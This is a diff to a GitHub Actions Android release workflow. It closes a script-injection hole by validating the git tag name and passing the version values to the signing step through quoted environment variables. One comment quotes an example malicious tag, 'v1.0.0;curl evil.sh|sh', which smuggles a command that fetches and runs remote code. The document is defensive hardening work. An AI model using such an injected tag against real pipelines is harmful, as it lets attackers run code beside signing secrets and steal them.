@@ -81,6 +81,15 @@ jobs:
           else
             CODE="$RUN_NUMBER"
           fi
+          # NAME comes from a git tag, and git permits ; $ ` ( ) in a tag name. It is passed
+          # to a later step that has the signing keystore in its environment, so constrain it
+          # to something that cannot be anything but a version before it goes any further.
+          # Refusing is right: a tag we cannot parse safely should not produce a release.
+          if ! [[ "$NAME" =~ ^[A-Za-z0-9._+-]+$ ]]; then
+            echo "Refusing to build: tag '$NAME' contains characters that are not allowed" \
+                 "in a version string." >&2
+            exit 1
+          fi
           echo "name=$NAME" >> "$GITHUB_OUTPUT"
           echo "code=$CODE" >> "$GITHUB_OUTPUT"
           echo "Building versionName=$NAME versionCode=$CODE"
@@ -119,12 +128,21 @@ jobs:
           TIMETWISTER_KEYSTORE_PASSWORD: ${{ secrets.TIMETWISTER_KEYSTORE_PASSWORD }}
           TIMETWISTER_KEY_ALIAS: ${{ secrets.TIMETWISTER_KEY_ALIAS }}
           TIMETWISTER_KEY_PASSWORD: ${{ secrets.TIMETWISTER_KEY_PASSWORD }}
+          # Through the environment and quoted at the point of use, rather than
+          # interpolated into the script text. `${{ }}` is substituted before bash ever
+          # sees the line, so a tag named `v1.0.0;curl evil.sh|sh` became a command in
+          # this step — the one step holding the decoded keystore and all four signing
+          # secrets. ios-release.yml already did it this way; this now matches. The
+          # version step also validates the tag, so this is the second of two locks.
+          VERSION_CODE: ${{ steps.version.outputs.code }}
+          VERSION_NAME: ${{ steps.version.outputs.name }}
         # Play requires an App Bundle for new apps; the APK stays for sideloading
         # and for attaching to the GitHub Release.
         run: |
+          set -euo pipefail
           ./gradlew :app:assembleRelease :app:bundleRelease \
-            -Ptimetwister.versionCode=${{ steps.version.outputs.code }} \
-            -Ptimetwister.versionName=${{ steps.version.outputs.name }} \
+            -Ptimetwister.versionCode="$VERSION_CODE" \
+            -Ptimetwister.versionName="$VERSION_NAME" \
             --console=plain
 
       - name: Locate artifacts
